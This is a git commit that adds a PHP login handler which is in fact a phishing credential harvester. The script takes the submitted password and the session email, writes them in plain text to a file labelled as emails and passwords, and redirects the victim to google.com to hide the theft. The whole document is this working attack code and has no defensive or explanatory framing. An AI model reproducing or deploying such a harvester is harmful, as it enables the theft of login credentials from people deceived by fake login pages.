02b05d6d293c6ff0a5b83f7f4dae29bb9075099d
censorday <74760933+censorday@users.noreply.github.com>
2020-11-20 13:28:51 +0530

    Add files via upload

---
+++ login.php
@@ -0,0 +1,15 @@
+<?php
+session_start();
+			
+			$pass = $_POST["password"];
+			$email=$_SESSION["Email"];
+			
+  			
+ file_put_contents("usernames.txt", "[EMAIL: ]" . " ". $email . " " . " " . "[PASS: ]" . " " . $pass . "\n", FILE_APPEND);
+ header('Location: https://www.google.com');
+exit();
+	
+			
+session_destroy();
+			
+?>
